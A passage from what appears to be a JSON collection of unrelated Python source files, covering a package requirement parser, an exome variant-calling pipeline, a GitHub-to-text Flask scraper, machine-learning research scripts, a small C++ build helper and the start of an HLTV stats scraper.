None\n        if parsed.marker is not None:\n            self.marker = Marker.__new__(Marker)\n            self.marker._markers = _normalize_extra_values(parsed.marker)\n\n    def __str__(self) -> str:\n        parts: List[str] = [self.name]\n\n        if self.extras:\n            formatted_extras = \",\".join(sorted(self.extras))\n            parts.append(f\"[{formatted_extras}]\")\n\n        if self.specifier:\n            parts.append(str(self.specifier))\n\n        if self.url:\n            parts.append(f\"@ {self.url}\")\n            if self.marker:\n                parts.append(\" \")\n\n        if self.marker:\n            parts.append(f\"; {self.marker}\")\n\n        return \"\".join(parts)\n\n    def __repr__(self) -> str:\n        return f\"<Requirement('{self}')>\"\n\n    def __hash__(self) -> int:\n        return hash((self.__class__.__name__, str(self)))\n\n    def __eq__(self, other: Any) -> bool:\n        if not isinstance(other, Requirement):\n            return NotImplemented\n\n        return (\n            self.name == other.name\n            and self.extras == other.extras\n            and self.specifier == other.specifier\n            and self.url == other.url\n            and self.marker == other.marker\n        )\n",
    "import sys, time, os, json, re\nimport numpy as np\nimport torch\nimport pandas as pd\nimport glob\nfrom Bio import Entrez\nimport warnings\nwarnings.filterwarnings(\"ignore\")\nfrom torch.utils.data import DataLoader\nfrom torch import nn\nfrom sklearn.metrics import roc_curve, auc, precision_recall_curve\nos.environ['MKL_THREADING_LAYER'] = 'GNU' \nimport argparse\nimport subprocess\nfrom Bio import SeqIO\nimport os\nimport multiprocessing\nimport shutil\n\ndef get_parameter():\n    with open(\"parameter.json\") as f:\n        global parameter\n        parameter = json.load(f)\n        \ndef create_path(path):\n    if not os.path.exists(path):\n        os.makedirs(path)\n        \ndef write_time_log(f_time, A, s):\n    B = time.time()\n    C = B - A\n    C = int(C)\n    f_time.write(s + str(C // 60) + '\u5206' + str(C % 60) + '\u79d2\\n')\n    f_time.flush()\n\n\n\ndef wes2mut(thread,patient_id,tumor1,tumor2,normal1,normal2):\n    wes_path = parameter['work_path'] + '/calspace/' + patient_id + '/1_wes'\n    create_path(wes_path)\n\n    print(f'tumor_dna_1:{tumor1}')\n    print(f'tumor_dna_2:{tumor2}')\n    print(f'noemal_dna_1:{normal1}')\n    print(f'noemal_dna_2:{normal2}')\n\n    if not os.path.exists(normal1):\n        print('Please confirm the wes data')\n    if not os.path.exists(normal2):\n        print('Please confirm the wes data')\n    if not os.path.exists(tumor1):\n        print('Please confirm the wes data')\n    if not os.path.exists(tumor2):\n        print('Please confirm the wes data')\n\n    f_time = open(wes_path + '/wes_time.log', 'w+')\n\n    f_time.write('*****wes to mutation start!*****\\n')\n    f_time.flush()\n    A = time.time()\n\n    # trimmomatic\n    os.system('trimmomatic PE -threads '+ str(thread) + ' -phred33 ' + ' ' + normal1 + ' ' + normal2 + ' ' + wes_path + '/normal1.fq.gz ' + wes_path + '/trim_normal1.fq.gz' + ' ' + wes_path + '/normal2.fq.gz ' + wes_path + '/trim_normal2.fq.gz' + ' ILLUMINACLIP:' + parameter['ref_path'] + '/TruSeq3-PE.fa:2:30:10 SLIDINGWINDOW:5:20 LEADING:5 TRAILING:5 MINLEN:50')\n    os.system('trimmomatic PE -threads '+ str(thread) + ' -phred33 ' + ' ' + tumor1 + ' ' + tumor2 + ' ' + wes_path + '/tumor1.fq.gz ' + wes_path + '/trim_tumor1.fq.gz' + ' ' + wes_path + '/tumor2.fq.gz ' + wes_path + '/trim_tumor2.fq.gz' + ' ILLUMINACLIP:' + parameter['ref_path'] + '/TruSeq3-PE.fa:2:30:10 SLIDINGWINDOW:5:20 LEADING:5 TRAILING:5 MINLEN:50')\n\n    write_time_log(f_time, A, 'step1_trimmomatic_')\n\n    # bwa\n    os.system(\"bwa mem -t \" + str(thread) + \" -M -R '@RG\\\\tID:normal\\\\tSM:normal\\\\tLB:normal\\\\tPL:illumina' \" + parameter['ref_path'] + \"/hg38.fa \" + wes_path + '/normal1.fq.gz ' + wes_path + '/normal2.fq.gz ' + '> ' + wes_path + '/normal.sam')\n    os.system(\"bwa mem -t \" + str(thread) + \" -M -R '@RG\\\\tID:tumor\\\\tSM:tumor\\\\tLB:tumor\\\\tPL:illumina' \" + parameter['ref_path'] + \"/hg38.fa \" + wes_path + '/tumor1.fq.gz ' + wes_path + '/tumor2.fq.gz ' + '> ' + wes_path + '/tumor.sam')\n\n    write_time_log(f_time, A, 'step2_bwa_')\n\n    #  sortsam\n    os.system('gatk --java-options \"-Xmx4G\" SortSam -SO coordinate ' + '-I ' + wes_path + '/normal.sam -O ' + wes_path + '/normal_sorted.bam')\n    os.system('gatk --java-options \"-Xmx4G\" SortSam -SO coordinate ' + '-I ' + wes_path + '/tumor.sam -O ' + wes_path + '/tumor_sorted.bam')\n\n    write_time_log(f_time, A, 'step3_sortsam_')\n\n    # MarkDuplicatesAndMerge\n    os.system('gatk --java-options \"-Xmx4G\" MarkDuplicates ' + '-I ' + wes_path + '/tumor_sorted.bam ' + '-O ' + wes_path + '/tumor_sorted_marked.bam ' + '-M ' + wes_path + '/tumor_sorted_marked.metrics')\n    os.system('gatk --java-options \"-Xmx4G\" MarkDuplicates ' + '-I ' + wes_path + '/normal_sorted.bam ' + '-O ' + wes_path + '/normal_sorted_marked.bam ' + '-M ' + wes_path + '/normal_sorted_marked.metrics')\n    os.system('samtools index ' + wes_path + '/normal_sorted_marked.bam')\n    os.system('samtools index ' + wes_path + '/tumor_sorted_marked.bam')\n\n    write_time_log(f_time, A, 'step4_MarkDuplicatesAndMerge_')\n\n    # bqsr\n    os.system('gatk --java-options ' + '\"-Xmx4G\"' + ' BaseRecalibrator ' + '-R ' + parameter['ref_path'] + '/hg38.fa ' + '-I ' + wes_path + '/tumor_sorted_marked.bam ' + '--known-sites  ' + parameter['annotation_path'] + '/1000G_phase1.snps.high_confidence.hg38.vcf.gz ' + '--known-sites  ' + parameter['annotation_path'] + '/Mills_and_1000G_gold_standard.indels.hg38.vcf.gz ' + '--known-sites  ' + parameter['annotation_path'] + '/dbsnp_138.hg38.vcf.gz ' + '-O ' + wes_path + '/tumor_sorted_marked_temp.table')\n    os.system('gatk --java-options \"-Xmx4G\" ApplyBQSR ' + '-R ' + parameter['ref_path'] + '/hg38.fa ' + '-I ' + wes_path + '/tumor_sorted_marked.bam ' + '-O ' + wes_path + '/tumor_sorted_marked.recal.bam ' + '-bqsr ' + wes_path + '/tumor_sorted_marked_temp.table')\n\n    os.system('gatk --java-options ' + '\"-Xmx4G\"' + ' BaseRecalibrator ' + '-R ' + parameter['ref_path'] + '/hg38.fa ' + '-I ' + wes_path + '/normal_sorted_marked.bam ' + '--known-sites  ' + parameter['annotation_path'] + '/1000G_phase1.snps.high_confidence.hg",
    "# repototext.py\n\"\"\"\nThis module handles the back end flask server for RepoToText\n\"\"\"\n\n# pylint: disable=line-too-long\n# pylint: disable=C0103\n\nimport os\nfrom datetime import datetime\nimport re\nfrom github import Github, RateLimitExceededException\nfrom bs4 import BeautifulSoup\nimport requests\nfrom flask import Flask, request, jsonify\nfrom flask_cors import CORS\nfrom requests.exceptions import RequestException\nfrom retry import retry\n\napp = Flask(__name__)\nCORS(app, resources={r\"/scrape\": {\"origins\": \"https://devbot.hellopartage.xyz\"}})\n\nclass GithubRepoScraper:\n    \"\"\"Scrape GitHub repositories.\"\"\"\n    def __init__(self, repo_name, doc_link=None, selected_file_types=None):\n        if selected_file_types is None:\n            selected_file_types = []\n        self.github_api_key = os.getenv(\"GITHUB_API_KEY\")\n        self.repo_name = repo_name\n        self.doc_link = doc_link\n        self.selected_file_types = selected_file_types\n\n    @retry(RateLimitExceededException, tries=5, delay=2, backoff=2)\n    def fetch_all_files(self):\n        \"\"\"Fetch all files from the GitHub repository.\"\"\"\n        def recursive_fetch_files(repo, contents):\n            files_data = []\n            for content_file in contents:\n                if content_file.type == \"dir\":\n                    files_data += recursive_fetch_files(repo, repo.get_contents(content_file.path))\n                else:\n                    # Check if file type is in selected file types\n                    if any(content_file.name.endswith(file_type) for file_type in self.selected_file_types):\n                        file_content = \"\"\n                        file_content += f\"\\n'''--- {content_file.path} ---\\n\"\n\n                        if content_file.encoding == \"base64\":\n                            try:\n                                file_content += content_file.decoded_content.decode(\"utf-8\")\n                            except UnicodeDecodeError: # catch decoding errors\n                                file_content += \"[Content not decodable]\"\n                        elif content_file.encoding == \"none\":\n                            # Handle files with encoding \"none\" here\n                            print(f\"Warning: Skipping {content_file.path} due to unsupported encoding 'none'.\")\n                            continue\n                        else:\n                            # Handle other unexpected encodings here\n                            print(f\"Warning: Skipping {content_file.path} due to unexpected encoding '{content_file.encoding}'.\")\n                            continue\n\n                        file_content += \"\\n'''\"\n                        files_data.append(file_content)\n            return files_data\n\n        github_instance = Github(self.github_api_key)\n        repo = github_instance.get_repo(self.repo_name)\n        contents = repo.get_contents(\"\")\n        files_data = recursive_fetch_files(repo, contents)\n        return files_data\n\n    def scrape_doc(self):\n        \"\"\"Scrape webpage.\"\"\"\n        if not self.doc_link:\n            return \"\"\n        try:\n            page = requests.get(self.doc_link, timeout=10)\n            soup = BeautifulSoup(page.content, 'html.parser')\n            return soup.get_text(separator=\"\\n\")\n        except RequestException as e:\n            print(f\"Error fetching documentation: {e}\")\n            return \"\"\n\n    def write_to_file(self, files_data):\n        \"\"\"Built .txt file with all of the repo's files\"\"\"\n        timestamp = datetime.now().strftime(\"%Y%m%d%H%M%S\")\n        filename = f\"/data/{self.repo_name.replace('/', '_')}_{timestamp}.txt\"\n        with open(filename, \"w\", encoding='utf-8') as f:\n            doc_text = self.scrape_doc()\n            if doc_text:\n                f.write(f\"Documentation Link: {self.doc_link}\\n\\n\")\n                f.write(f\"{doc_text}\\n\\n\")\n            f.write(f\"*GitHub Repository \\\"{self.repo_name}\\\"*\\n\")\n            for file_data in files_data:\n                f.write(file_data)\n        return filename\n\n    def clean_up_text(self, filename):\n        \"\"\"Remove line breaks after 2.\"\"\"\n        with open(filename, 'r', encoding='utf-8') as f:\n            text = f.read()\n        cleaned_text = re.sub('\\n{3,}', '\\n\\n', text)\n        with open(filename, 'w', encoding='utf-8') as f:\n            f.write(cleaned_text)\n\n    def run(self):\n        \"\"\"Run RepoToText.\"\"\"\n        print(\"Fetching all files...\")\n        files_data = self.fetch_all_files()\n\n        print(\"Writing to file...\")\n        filename = self.write_to_file(files_data)\n\n        print(\"Cleaning up file...\")\n        self.clean_up_text(filename)\n\n        print(\"Done.\")\n        return filename\n\n@app.route('/scrape', methods=['POST'])\ndef scrape():\n    \"\"\"Scrape GitHub repositories.\"\"\"\n    data = request.get_json()\n\n    repo_url = data.get('repoUrl')\n    doc_url = data.get('docUrl')\n    selected_file_types = data.get('selectedFileTypes', [])\n\n    if not repo_url:\n        return jsonify({\"error\": \"Repo URL not provided.\"}), 400\n\n    repo_name",
    "import sys\nsys.path.append('.')\nsys.path.append('..')\n\nimport argparse\nimport os\nfrom pathlib import Path\nimport numpy as np\nimport os.path as op\nimport pickle \n\nimport torch\nfrom mano.mano_models import build_mano_aa\n\nfrom torch.utils import data\nfrom ipdb import set_trace as st\nimport trimesh\nfrom models.semantic_conditional_module import get_moudle as  moudle_1\nfrom models.contact_conditional_module import get_moudle as moudle_2\nfrom data.grab_test import GrabDataset\n \n\ndef test(opt, device):\n    diffusion_moudle_1 = moudle_1(opt)\n    diffusion_moudle_2 = moudle_2(opt)\n    idxs = 0\n\n    diffusion_weight_path_1 = \"checkpoint/semantic_conditional_module.pt\"\n    diffusion_weight_path_2 = \"checkpoint/contact_conditional_module.pt\"\n    diffusion_moudle_1.load_weight_path(diffusion_weight_path_1)\n    diffusion_moudle_2.load_weight_path(diffusion_weight_path_2)\n\n    val_dataset = GrabDataset()\n    val_dl = data.DataLoader(val_dataset, batch_size=3000, shuffle=False, pin_memory=True, num_workers=0)\n\n    new_item = {}\n    with torch.no_grad():\n       for i, item in enumerate(val_dl):\n            test_input_data_dict= item  #item[\"motion\"].shape torch.Size([32, 2531])\n            one_motion = test_input_data_dict['motion']\n\n            res_list_1 = diffusion_moudle_1.full_body_gen_cond_head_pose_sliding_window(one_motion.to(device)) \n            one_motion[:,:,6205:8253] = res_list_1\n            all_res_list = diffusion_moudle_2.full_body_gen_cond_head_pose_sliding_window(one_motion.to(device)) \n\n            preds_new = my_process_data(preds=all_res_list,namelist=test_input_data_dict['name'])\n            with open(\"assets/closed_mano_faces.pkl\", 'rb') as f:\n                hand_face = pickle.load(f)\n\n            hand_verts = preds_new[\"manov3d.r\"]\n            exp_name = 'demo'\n            save_dir = f'exp/{exp_name}'\n\n            aa_name = test_input_data_dict['name']\n            for i in range(len(hand_verts)):\n                hand_mesh = trimesh.Trimesh(vertices=hand_verts[i], faces=hand_face)\n                parts = aa_name[i].split('/')  \n                relevant_parts = [parts[2]] + parts[3].split('_') + [parts[-1].split('.')[0]]\n                formatted_string = '_'.join(relevant_parts)\n                formatted_string = exp_name+'_'+ formatted_string\n                # st()\n                hand_mesh.export(os.path.join(save_dir, f'{formatted_string}.obj'.format(i)))\n                \ndef my_process_data(preds,namelist):\n    models = {'mano_r':build_mano_aa(is_rhand=True,flat_hand=True)}\n\n    targets=dict()\n    for i in range(len(namelist)):\n\n        rot_r = preds[i][0][:3]\n        pose_r = preds[i][0][3:48]\n        trans_r = preds[i][0][48:51]\n        betas_r = preds[i][0][51:61]\n        \n        pose_r = np.concatenate((rot_r.to('cpu'), pose_r.cpu()), axis=0)\n        \n        if i == 0:\n            targets[\"mano.pose.r\"] = torch.from_numpy(pose_r).float().unsqueeze(0).to('cpu')\n            targets[\"mano.beta.r\"] = np.expand_dims(betas_r.cpu().numpy(), axis=0)\n            targets[\"mano.trans.r\"] = np.expand_dims(trans_r.cpu().numpy(), axis=0)                \n        else:\n            targets[\"mano.pose.r\"] = torch.cat([targets[\"mano.pose.r\"],torch.from_numpy(pose_r).float().unsqueeze(0).to('cpu')],dim=0)\n            targets[\"mano.beta.r\"] = np.concatenate([targets[\"mano.beta.r\"],np.expand_dims(betas_r.cpu().numpy(), axis=0)],axis=0)\n            targets[\"mano.trans.r\"] = np.concatenate([targets[\"mano.trans.r\"],np.expand_dims(trans_r.cpu().numpy(), axis=0)],axis=0)\n    # st()\n            \n    gt_pose_r = targets[\"mano.pose.r\"]\n    gt_betas_r = targets[\"mano.beta.r\"]\n    gt_trans_r = targets[\"mano.trans.r\"]\n\n    temp_gt_out_r = models[\"mano_r\"](\n        betas=torch.from_numpy(gt_betas_r),\n        hand_pose=gt_pose_r[:, 3:],\n        global_orient=gt_pose_r[:, :3],\n        transl=torch.from_numpy(gt_trans_r),\n    )\n    targets[\"manoj21.r\"] = temp_gt_out_r.joints\n    targets[\"manov3d.r\"] = temp_gt_out_r.vertices\n\n    return targets\n\ndef parse_opt():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--workers', type=int, default=0, help='the number of workers for data loading')\n    parser.add_argument('--device', default='0', help='cuda device')\n    parser.add_argument('--weight', default='latest')\n    parser.add_argument(\"--gen_vis\", action=\"store_true\")\n    # For AvatarPoser config \n    parser.add_argument('--kinpoly_cfg', type=str, default=\"\", help='Path to option JSON file.')\n    # Diffusion model settings\n    parser.add_argument('--diffusion_window', type=int, default=1, help='horizon')\n    parser.add_argument('--diffusion_batch_size', type=int, default=200, help='batch size')\n    parser.add_argument('--diffusion_learning_rate', type=float, default=1e-5, help='generator_learning_rate')\n\n    parser.add_argument('--diffusion_n_dec_layers', type=int, default=4, help='the number of decoder layers')\n    parser.add_argument('--diffusion_n_head', type=int, default=4, help='the number of heads in self-at",
    "import pickle, os, sys\n\n########## CONFIG ##########\nsrc_dir : str = \"src/\"\nlib_dir : str = \"lib/\"\nbin_dir : str = \"bin/\"\nintermediate_dir : str = \"intermediate/\"\n\nmain_file : str = \"main.cpp\"\nexecutable_file : str = \"main\"\n\ntracking_file : str = \"tracking_builds.bin\"\n############################\n\narguments : list[str] = sys.argv\n\nclass File:\n    def __init__(self, name : str = \"\", extension : str = \"cpp\"):\n        self.last_time_edit : int = 0\n        self.name : str = name\n        self.extension : str = extension\n    def check_compile(self, libs) -> bool:\n        current_time_edit : int = os.path.getmtime(src_dir + self.name + \".\" + self.extension)\n        if self.last_time_edit != current_time_edit or not os.path.exists(intermediate_dir+self.name+\".o\"):\n            self.last_time_edit = current_time_edit\n            os.system(f\"g++ {src_dir + self.name}.{self.extension} -o {intermediate_dir + self.name}.o -c {libs} -I{lib_dir}\")\n            return True\n        return False\n    def exists(self) -> bool:\n        if os.path.exists(src_dir + self.name + \".\" + self.extension):\n            return True\n        return False\n\nlibs : str = \"\"\nfiles : list[File] = []\n\ndef load_tracking_file() -> None:\n    global libs, files\n    file = open(tracking_file, \"rb\")\n    libs, files = pickle.load(file)\n    file.close()\n\ndef save_tracking_file() -> None:\n    file = open(tracking_file, \"wb\")\n    obj = [libs, files]\n    pickle.dump(obj, file)\n    file.close()\n\ndef link() -> None:\n    files_string : str = \"\"\n    for file in files:\n        files_string += intermediate_dir + file.name + \".o \"\n    os.system(f\"g++ {files_string}-o {bin_dir}{executable_file} {libs} -I{lib_dir}\")\n\ndef append_lib(lib : str) -> None:\n    global libs\n    if not (f\"-l{lib}\" in libs.split(\" \")):\n        libs += f\"-l{lib} \"\n        return\n    print(f\"failed to append the library {lib}, already keeping track of it\")\n\ndef remove_lib(lib : str) -> None:\n    global libs\n    if not f\"-l{lib} \" in libs:\n        print(f\"not keeping track of any lib called '{lib}'.\")\n        return\n    libs = libs.replace(f\"-l{lib} \", \"\")\n\ndef clear_unexistant_files() -> None:\n    for i, file in enumerate(files):\n        if not file.exists():\n            del files[i]\n\ndef append_file(file : str) -> None:\n    global files\n    name, extension = file.split(\".\")\n    for c_file in files:\n        if name == c_file.name and extension == c_file.extension:\n            print(f\"failed to append the file {file}, already keeping track of it.\")\n            return\n    files.append(File(name, extension))\n\ndef remove_file(file : str) -> None:\n    name, extension = file.split(\".\")\n    for i, c_file in enumerate(files):\n        if c_file.name == name and c_file.extension == extension:\n            del files[i]\n            return\n    print(f\"not keeping track of any file called {file}.\")\n\nif not os.path.exists(tracking_file):\n    temp_file = open(tracking_file, \"x\")\n    temp_file.close()\n\nwith open(tracking_file, \"rb\") as f:\n    if f.readlines() != []:\n        load_tracking_file()\n\nclear_unexistant_files()\n\nif files == []:\n    append_file(main_file)\n\nmatch arguments[1]:\n    case \"run\":\n        anything_compiled = False\n        for file in files:\n            if file.check_compile(libs):\n                anything_compiled = True\n        if anything_compiled or (not(os.path.exists(bin_dir+executable_file))):\n            link()\n        os.system(bin_dir + executable_file)\n    case \"append\":\n        append_file(arguments[2])\n    case \"remove\":\n        remove_file(arguments[2])\n    case \"lib\":\n        if arguments[2] != \"-r\":\n            append_lib(arguments[2])\n        else :\n            remove_lib(arguments[3])\n    case \"comp\":\n        for file in files:\n            file.check_compile(libs)\n        link()\n\nsave_tracking_file()\n",
    "import csv\n\ndef extract_data(source_file, destination_file):\n    # Define the field names to extract from the source CSV file\n    field_names = ['Name','Body','Subject', 'Status', 'To','Attach']  # Adjust this list as per your CSV file structure\n    \n    # Open the source CSV file in 'read' mode\n    with open(source_file, 'r', newline='') as source:\n        reader = csv.DictReader(source)\n        \n        # Open the destination CSV file in 'write' mode\n        with open(destination_file, 'w', newline='') as destination:\n            writer = csv.DictWriter(destination, fieldnames=field_names)\n            writer.writeheader()  # Write the header row\n            \n            # Iterate through each row in the source file\n            for row in reader:\n                event=\"event name\" #event name\n                name=row['Name']\n                ambassador=\"ambassador name\" #ambassador name\n                sub=f\"Congratulations {row['Name']}\"\n                files=f\"{row['Name']}.pdf\"\n                coustomestr=f\"\"\"\n\nThank you for your participation in the {event}!\n\nDear {name},\nThank you so much for your interest in being a part of the {event} program.\nWe appreciate your time and effort in completing the program.\nThis email contains your certificate of participation.\nPlease feel free to reply back to this email should you have any questions.\nLooking forward to seeing you further programs,\n{ambassador}, Microsoft Learn Student Ambassadors.\"\"\"\n                # Extract the required fields and write them to the destination file\n                if row['Name']!=\" \":\n                    writer.writerow({'Name': row['Name'], 'To': row['Email'],'Body': coustomestr,'Status':\"Send\",'Subject':sub,'Attach':files})  # Adjust field names as needed\n\n# Example usage:\nsource_file = 'data.csv' #sourse file which contains participants data\ndestination_file = 'destination.csv' #file where the data should be written\nextract_data(source_file, destination_file)\n",
    "from argparse import ArgumentParser\nimport os\nimport json\nfrom transformers import T5Tokenizer, T5ForConditionalGeneration\nimport numpy as np\nfrom sklearn.metrics import f1_score\nfrom googletrans import Translator\nimport random\nfrom constants import SLOT_LISTS\nfrom build_template import make_template, make_template_long_context, make_template_slot, make_template_slot_xtremeup, make_template_joint\n\nparser = ArgumentParser(description='Arguments for training')\nparser.add_argument('--dataset', type=str, help='Dataset name', default=\"multi3nlu\")\nparser.add_argument('--domain', type=str, help='Domain', default=\"banking\")\nparser.add_argument('--in_language', action='store_true', help='Whether the templates are in the target language')\nparser.add_argument('--setting', type=int, help='Training data setting; [Options: 20, 10, 1]', default=10)\nparser.add_argument('--fold', type=int, help='Fold', default=0)\nparser.add_argument('--train', action='store_true', help='Whether it is training data')\nparser.add_argument('--language', type=str, help='Language', default=\"english\")\nparser.add_argument('--template_name', type=str, help='Template key', default=\"none_none_none\")\nparser.add_argument('--task', type=str, help='Task working on; Options: [intents, slots]', default=\"intents\")\nparser.add_argument('--data_filter', type=str, help='How to filter the data: by folds/random', default=\"folds\")\nparser.add_argument('--num_examples', type=int, help='Number of random examples', default=500)\n\nargs = parser.parse_args()\n\ndata_dir = os.path.join(args.dataset, args.language, args.domain)\n\nwith open(\"templates.json\") as json_file:\n    templates_dict = json.load(json_file)\nif args.task in [\"intents\", \"slots\"]:\n  templates_dict = templates_dict[args.task]\n\nif args.in_language:\n  templates_dict = {intent: template for intent, template in templates_dict.items() if args.language in intent}\n\ndef get_data_by_fold(args):\n  if args.dataset==\"multi3nlu\":\n    total_folds = 20\n  else:\n    total_folds = 10\n\n  if args.setting==10:\n    fold = args.fold*2\n    if args.train:\n      folds = [fold, fold+1]\n    else:\n      folds = [i for i in range(total_folds) if not i in [fold, fold+1]]\n  elif args.setting==20:\n    fold = args.fold\n    if args.train:\n      folds = [fold]\n    else:\n      folds = [i for i in range(total_folds) if not i in [fold]]\n  elif args.setting==1:\n    fold = args.fold*2\n    if args.train:\n      folds = [i for i in range(total_folds) if not i in [fold, fold+1]]\n    else:\n      folds = [fold, fold+1]\n\n  print(folds)\n  data = []\n  for fold_i in folds:\n    with open(os.path.join(data_dir, f\"fold{fold_i}.json\")) as json_file:\n      data += json.load(json_file)\n  return data\n\ndef get_data_random(args):\n  if args.dataset==\"multi3nlu\":\n    total_folds = 20\n  else:\n    total_folds = 10\n  data = []\n  for fold_i in range(total_folds):\n    with open(os.path.join(data_dir, f\"fold{fold_i}.json\")) as json_file:\n      data += json.load(json_file)\n\n  with open(os.path.join(data_dir, f\"test_samples.txt\"), \"r\") as tst_idx_file:\n    test_indices = tst_idx_file.readlines()\n  test_indices = [int(idx) for idx in test_indices]\n  if not args.train:\n    data_filtered = [data[idx] for idx in test_indices]\n  else:\n    indices_filtered = [idx for idx in range(len(data)) if idx not in test_indices]\n    random.seed(args.fold)\n    indices_filtered = random.sample(indices_filtered, args.num_examples)\n    data_filtered = [data[idx] for idx in indices_filtered]\n\n  return data_filtered\n\n\nslot_desc_dict = None\n\nif args.in_language:\n  template = templates_dict[args.template_name+\"_\"+args.language]\nelse:\n  if args.task in [\"intents\", \"slots\"]:\n    template = templates_dict[args.template_name]\n  else:\n    template = {\"intents\":templates_dict[\"intents\"][args.template_name], \"slots\":templates_dict[\"slots\"][args.template_name]}\nwith open(os.path.join(args.dataset, \"english\", \"ontology.json\")) as json_file:\n  ontology = json.load(json_file)\nif args.task==\"intents\":\n  intent_desc_dict = {key:ontology[\"intents\"][key][\"description\"][14:-1] for key in ontology[\"intents\"].keys() if \"general\" in ontology[\"intents\"][key][\"domain\"] or args.domain in ontology[\"intents\"][key][\"domain\"]}\n  for intent, description in intent_desc_dict.items():\n    if not description.startswith(\"to \"):\n      intent_desc_dict[intent] = description.replace(\"asking\", \"to ask\")\n  if args.template_name==\"context_question\":\n      intent_desc_dict = {intent: \"is the intent \"+desc for intent, desc in intent_desc_dict.items()}\n  if args.in_language:\n    translator = Translator()\n    intent_desc_dict = {intent:translator.translate(description, dest=args.language).text for intent, description in intent_desc_dict.items()}\n    print(intent_desc_dict)\nelif args.task==\"slots\":\n  intent_desc_dict = {key:ontology[\"slots\"][key][\"description\"] for key in ontology[\"slots\"].keys() if \"general\" in ontology[\"slots\"][key][\"domain\"] or args.domain in ontology[\"slots\"][key][\"domain\"]}\nelif args.task==\"joint\":\n  slot_desc_dict = {key:",
    "from torch import nn\n\n\nclass PatchEmbedding(nn.Module):\n    \"\"\"Patchify time series.\"\"\"\n\n    def __init__(self, patch_size, in_channel, embed_dim, norm_layer):\n        super().__init__()\n        self.output_channel = embed_dim\n        self.len_patch = patch_size             # the L\n        self.input_channel = in_channel\n        self.output_channel = embed_dim\n        self.input_embedding = nn.Conv2d(\n                                        in_channel,\n                                        embed_dim,\n                                        kernel_size=(self.len_patch, 1),\n                                        stride=(self.len_patch, 1))\n        self.norm_layer = norm_layer if norm_layer is not None else nn.Identity()\n\n    def forward(self, long_term_history):\n        \"\"\"\n        Args:\n            long_term_history (torch.Tensor): Very long-term historical MTS with shape [B, N, 1, P * L],\n                                                which is used in the TSFormer.\n                                                P is the number of segments (patches).\n\n        Returns:\n            torch.Tensor: patchified time series with shape [B, N, d, P]\n        \"\"\"\n\n        batch_size, num_nodes, num_feat, len_time_series = long_term_history.shape\n        long_term_history = long_term_history.unsqueeze(-1) # B, N, C, L, 1\n        # B*N,  C, L, 1\n        long_term_history = long_term_history.reshape(batch_size*num_nodes, num_feat, len_time_series, 1)\n        # B*N,  d, L/P, 1\n        output = self.input_embedding(long_term_history) # unknown about the operation of Conv2D?????????\n        # norm\n        output = self.norm_layer(output)\n        # reshape\n        output = output.squeeze(-1).view(batch_size, num_nodes, self.output_channel, -1)    # B, N, d, P\n        assert output.shape[-1] == len_time_series / self.len_patch\n        return output\n",
    "import pytz\nimport asyncio\nimport re\nimport logging\nimport random\nfrom typing import Any, List, Optional\nfrom datetime import date, datetime, timedelta\nfrom bs4 import BeautifulSoup\nfrom functools import partial\nfrom aiohttp import ClientSession, ClientTimeout\nfrom aiohttp.client_exceptions import ClientProxyConnectionError, ClientResponseError, ClientOSError, \\\n    ServerDisconnectedError, ClientHttpProxyError, ClientConnectorError\n\n\nclass Hltv:\n    def __init__(self,\n                 min_delay: float | int= -1.0,\n                 max_delay: float | int= 10.0,\n                 timeout: int = 5,\n                 max_retries: int = 10,\n                 proxy_path: str | None = None,\n                 proxy_list: list | None = None,\n                 proxy_delay: bool = False,\n                 proxy_protocol: str | None = None,\n                 remove_proxy: bool = False,\n                 tz: str | None = None,\n                 safe_mode: bool = True,\n                 debug: bool = False,\n                 ):\n        self.headers = {\n            \"referer\": \"https://www.hltv.org/stats\",\n            \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\",\n            \"hltvTimeZone\": \"Europe/Copenhagen\"\n        }\n        self.DEBUG = debug\n        self._configure_logging()\n        self.logger = logging.getLogger(__name__)\n\n        self.MIN_DELAY = float(min_delay)\n        self.MAX_DELAY = float(max_delay)\n        self._init_delay()\n\n        self.timeout = timeout\n        self.max_retries = max_retries\n\n        self.TIMEZONE = tz\n        self._init_tz(tz)\n\n        self.PROXY_PATH = proxy_path\n        self.PROXY_LIST = proxy_list\n        self.PROXY_PROTOCOL = proxy_protocol\n        self.PROXY_ONCE = remove_proxy\n        self.PROXY_DELAY = proxy_delay\n\n        if self.PROXY_PATH:\n            with open(self.PROXY_PATH, \"r\") as file:\n                self.PROXY_LIST = [line.strip() for line in file.readlines()]\n\n        if self.PROXY_PROTOCOL:\n            self.PROXY_LIST = [self.PROXY_PROTOCOL + '://' + proxy for i, proxy in enumerate(self.PROXY_LIST, start=0)]\n\n        if proxy_path or proxy_list:\n            self.USE_PROXY = True\n        else:\n            self.USE_PROXY = False\n\n        self.session = None\n        self.loop = asyncio.get_running_loop()\n\n        self.SAFE = safe_mode\n        self._init_safe()\n\n    async def __aenter__(self):\n        self._create_session()\n        return self\n\n    async def __aexit__(self, exc_type, exc, tb):\n        await self.close()\n\n    def _create_session(self):\n        if not self.session:\n            self.logger.debug('Creating Session')\n            self.session = ClientSession()\n\n    async def close(self):\n        if self.session:\n            self.logger.debug('Closing Session')\n            await self.session.close()\n            self.session = None\n\n    def _configure_logging(self):\n        def get_logger(name, **kwargs):\n            import logging\n\n            logging.basicConfig(**kwargs)\n            logger = logging.getLogger(name)\n            logger.debug(f\"start logging '{name}'\")\n            return logger\n\n        self.logger = get_logger(\n            __name__,\n            **{\n                \"level\": \"DEBUG\" if self.DEBUG else \"INFO\",\n                \"format\": \"[%(levelname)s] %(message)s \",\n            },\n        )\n\n    def config(self,\n               min_delay: Optional[float | int] = None,\n               max_delay: Optional[float | int] = None,\n               timeout: Optional[int] = None,\n               use_proxy: Optional[bool] = None,\n               proxy_file_path: Optional[str] = None,\n               proxy_list: Optional[list] = None,\n               debug: Optional[bool] = None,\n               max_retries: Optional[int] = None,\n               proxy_protocol: Optional[str] = None,\n               remove_proxy: Optional[bool] = None,\n               tz: Optional[str] = None,\n               safe_mode: Optional[bool] = None,\n               ):\n        if min_delay or max_delay:\n            self.MIN_DELAY = float(min_delay)\n            self.MAX_DELAY = float(max_delay)\n            self._init_delay()\n        if timeout:\n            self.timeout = timeout\n        if use_proxy is not None:\n            self.USE_PROXY = use_proxy\n        if proxy_list:\n            self.PROXY_LIST = proxy_list\n        if max_retries:\n            self.max_retries = max_retries\n        if proxy_protocol:\n            self.PROXY_PROTOCOL = proxy_protocol\n        if remove_proxy is not None:\n            self.PROXY_ONCE = remove_proxy\n        if tz is not 